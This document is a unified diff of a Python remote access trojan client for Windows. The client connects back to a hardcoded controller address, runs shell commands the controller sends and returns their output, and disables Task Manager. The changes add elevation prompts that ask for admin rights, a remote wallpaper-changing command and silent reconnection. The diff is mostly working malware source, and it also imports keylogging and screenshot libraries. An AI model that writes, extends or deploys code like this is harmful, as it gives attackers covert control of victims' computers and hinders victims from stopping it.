@@ -1,21 +1,54 @@
-import socket, os, sys, platform, time, ctypes, subprocess, pyscreeze, threading, pynput.keyboard, wmi, json
-import win32api, winerror, win32event
+import socket, os, sys, platform, time, ctypes, subprocess, pyscreeze, threading, pynput.keyboard, wmi, json, enum, requests, win32api, winerror, win32event, getpass
 from shutil import copyfile
 from winreg import *
 from io import StringIO, BytesIO
 from cryptography.fernet import Fernet
 
+
 strHost = "10.5.148.3"
-# strHost = socket.gethostbyname("")
 intPort = 3000
 
 strPath = os.path.realpath(sys.argv[0])  # get file path
 TMP = os.environ["TEMP"]  # get temp path
 APPDATA = os.environ["APPDATA"]
 intBuff = 1024
+runFirst = True
 
 blnMeltFile = False
 blnAddToStartup = False
+
+class SW(enum.IntEnum):
+    
+    HIDE = 0
+    MAXIMIZE = 3
+    MINIMIZE = 6
+    RESTORE = 9
+    SHOW = 5
+    SHOWDEFAULT = 10
+    SHOWMAXIMIZED = 3
+    SHOWMINIMIZED = 2
+    SHOWMINNOACTIVE = 7
+    SHOWNA = 8
+    SHOWNOACTIVATE = 4
+    SHOWNORMAL = 1
+
+
+class ERROR(enum.IntEnum):
+
+    ZERO = 0
+    FILE_NOT_FOUND = 2
+    PATH_NOT_FOUND = 3
+    BAD_FORMAT = 11
+    ACCESS_DENIED = 5
+    ASSOC_INCOMPLETE = 27
+    DDE_BUSY = 30
+    DDE_FAIL = 29
+    DDE_TIMEOUT = 28
+    DLL_NOT_FOUND = 32
+    NO_ASSOC = 31
+    OOM = 8
+    SHARE = 26
+
 
 # function to prevent multiple instances
 mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
@@ -296,53 +329,86 @@ def shutdown(shutdowntype):
     except Exception:
         send(b"unable to execute command")
 
+
+def setWallpaper(url):
+    if ctypes.windll.shell32.IsUserAnAdmin():
+        try:
+            path = os.path.join(os.getcwd(), 'wallpaper.jpg')
+            path_file = "C:/Users/{0}/AppData/Roaming/Microsoft/Windows/Themes/TranscodedWallpaper".format(getpass.getuser())
+
+            image = requests.get(url)
+            with open(path_file, 'wb') as f:
+                f.write(image.content)
+
+            with open(path, 'wb') as f:
+                f.write(image.content)
+
+            os.system('reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "{0}" /f'.format(path))
+            os.system('RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters')
+        except Exception:
+            send(b"unable to set wallpaper (file needs to be jpg")
+    else:
+        hinstance = ctypes.windll.shell32.ShellExecuteW(
+            None, 'runas', sys.executable, sys.argv[0], None, SW.SHOWNORMAL
+        )
+        if hinstance <= 32:
+            raise RuntimeError(ERROR(hinstance))
+
+
 def command_shell():
-    try:
-        strCurrentDir = os.getcwd()
-        send(os.getcwdb())
-        bytData = b""
+    if ctypes.windll.shell32.IsUserAnAdmin():
+        try:
+            strCurrentDir = os.getcwd()
+            send(os.getcwdb())
+            bytData = b""
 
-        while True:
-            strData = recv(intBuff).decode()
+            while True:
+                strData = recv(intBuff).decode()
 
-            if strData == "goback":
-                os.chdir(strCurrentDir)  # change directory back to original
-                break
+                if strData == "goback":
+                    os.chdir(strCurrentDir)  # change directory back to original
+                    break
 
-            elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
-                objCommand = subprocess.Popen(
-                    strData + " & cd",
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    stdin=subprocess.PIPE,
-                    shell=True,
-                )
-                if objCommand.stderr.read().decode() == "":  # if there is no error
+                elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
+                    objCommand = subprocess.Popen(
+                        strData + " & cd",
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
+                        stdin=subprocess.PIPE,
+                        shell=True,
+                    )
+                    if objCommand.stderr.read().decode() == "":  # if there is no error
+                        strOutput = (
+                            (objCommand.stdout.read()).decode().splitlines()[0]
+                        )  # decode and remove new line
+                        os.chdir(strOutput)  # change directory
+
+                        bytData = f"\n{os.getcwd()}>".encode()  # output to send the server
+
+                elif len(strData) > 0:
+                    objCommand = subprocess.Popen(
+                        strData,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
+                        stdin=subprocess.PIPE,
+                        shell=True,
+                    )
                     strOutput = (
-                        (objCommand.stdout.read()).decode().splitlines()[0]
-                    )  # decode and remove new line
-                    os.chdir(strOutput)  # change directory
+                        objCommand.stdout.read() + objCommand.stderr.read()
+                    )  # since cmd uses bytes, decode it
+                    bytData = strOutput + b"\n" + os.getcwdb() + b">"
+                else:
+                    bytData = b"Error!"
 
-                    bytData = f"\n{os.getcwd()}>".encode()  # output to send the server
-
-            elif len(strData) > 0:
-                objCommand = subprocess.Popen(
-                    strData,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE,
-                    stdin=subprocess.PIPE,
-                    shell=True,
-                )
-                strOutput = (
-                    objCommand.stdout.read() + objCommand.stderr.read()
-                )  # since cmd uses bytes, decode it
-                bytData = strOutput + b"\n" + os.getcwdb() + b">"
-            else:
-                bytData = b"Error!"
-
-            sendall(bytData)  # send output
-    except Exception:
-        send(b"unable to execute command")
+                sendall(bytData)  # send output
+        except Exception:
+            send(b"unable to execute command")
+        else:
+            hinstance = ctypes.windll.shell32.ShellExecuteW(
+                None, 'runas', sys.executable, sys.argv[0], None, SW.SHOWNORMAL
+            )
+            if hinstance <= 32:
+                raise RuntimeError(ERROR(hinstance))
 
 
 def python_interpreter():
@@ -496,9 +562,6 @@ def run_command(command):
     except Exception:
         send(b"unable to execute command")
 
-
-disable_taskmgr();
-
 while True:
     try:
         while True:
@@ -509,6 +572,15 @@ while True:
                 objSocket.close()
                 # sys.exit(0)
                 break
+            elif runFirst == True:
+                if not "blnDisabled" in globals():  # if the variable doesnt exist yet
+                    blnDisabled = True
+                try:
+                    disable_taskmgr()
+                except Exception:
+                    print("unable to disable taskmanager")
+
+                runFirst = False
             elif strData[:3] == "msg":
                 MessageBox(strData[3:])
             elif strData == "startup":
@@ -531,6 +603,8 @@ while True:
                 shutdown("-r")
             elif strData == "test":
                 continue
+            elif strData[:3] == "wallpaper":
+                setWallpaper(strData[3:])
             elif strData == "cmd":
                 command_shell()
             elif strData == "python":
@@ -551,6 +625,8 @@ while True:
         objSocket.close()
         del objSocket
         # server_connect()
+    except Exception:
+        pass
     finally:
         server_connect()
 
